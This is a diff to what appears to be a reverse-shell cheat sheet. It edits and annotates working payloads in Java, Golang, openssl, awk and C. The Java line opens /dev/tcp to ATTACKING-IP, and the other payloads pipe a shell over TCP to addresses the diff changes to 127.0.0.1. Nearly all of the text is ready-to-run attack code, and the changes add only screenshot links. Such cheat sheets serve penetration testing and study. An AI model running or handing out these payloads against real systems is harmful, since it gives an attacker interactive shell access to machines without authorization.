@@ -168,15 +168,17 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while r
 p.waitFor()
 
 ```
+![agent](../images/WechatIMG56.jpeg)
+
 
 Golang
 
 ```golang
 
-echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1234");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 
 ```
-
+![agent](../images/WechatIMG64.jpeg)
 
 Nodejs
 
@@ -209,6 +211,9 @@ or
 
 ```
 
+![agent](../images/WechatIMG63.jpeg)
+
+
 用openssl 反弹shell
 
 
@@ -231,7 +236,7 @@ openssl s_client -quiet -connect 127.0.0.1:1234|/bin/bash|openssl s_client -quie
 
 ```
 
-
+![agent](../images/WeChat8872f342986ad270beb9f2cfed15620b.png)
 
 
 ```bash
@@ -253,13 +258,13 @@ awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell>" |&
 #include <arpa/inet.h>
 
 int main(void){
-    int port = 4242;
+    int port = 1234;
     struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
     revsockaddr.sin_family = AF_INET;       
     revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
+    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
     connect(sockt, (struct sockaddr *) &revsockaddr, 
     sizeof(revsockaddr));
@@ -273,6 +278,8 @@ int main(void){
     return 0;       
 }
 
+
+![agent](../images/WeChatb7a57e2e1c37e20c37bb206518c75d7a.png)
 ```
 
 
